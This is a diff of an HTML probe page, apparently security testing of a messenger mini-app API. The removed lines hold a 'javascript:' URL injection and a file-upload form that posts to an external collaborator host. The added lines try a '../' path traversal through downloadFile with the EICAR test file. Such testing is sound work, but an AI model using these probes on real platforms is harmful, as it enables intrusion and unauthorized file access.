@@ -1,22 +1,20 @@
 <hr>
-<!--
 <script>
-window.parent.postMessage(
-  JSON.stringify({
-      "type": "WebAppOpenLink",
-      "url": "javascript:alert(1)"
-  }),
-  "*"
-);
-window.addEventListener("message", (event) => {
-  console.log("Полученные данные:", event.data);
-});
+  function DownloadFileFunction() {
+    window.WebApp.downloadFile("https://secure.eicar.org/eicar.com.txt", "../max_traversal_probe.txt").then(res => {
+      savedkey = JSON.stringify(res);
+      document.getElementById("output3").innerHTML = "<h2>downloadFile attempt:<br/>" + savedkey + "</h2>";
+    }
+    ).catch((err)=> {
+      document.getElementById("output2").innerHTML = "<h2>downloadFile error:<br/>" + err + "</h2>";
+    });
+  }
 </script>
--->
+<script src="https://st.max.ru/js/max-web-app.js"></script>
+
 <body>
 HELLO
-<form action="https://ig2xb4pv7wsei158duzmt2f9c0ir6hu6.oastify.com/upload" method="post" enctype="multipart/form-data">
-<label for="file-upload">Выберите файл:</label>
-<input type="file" id="file-upload" name="file">
-  <button type="submit">Отправить</button>
-</form> </body>
+
+<button onclick="DownloadFileFunction()">WebAppDownloadFile</button>
+<p id="output2" style="display:inline-block;"></p>
+<script> </body>
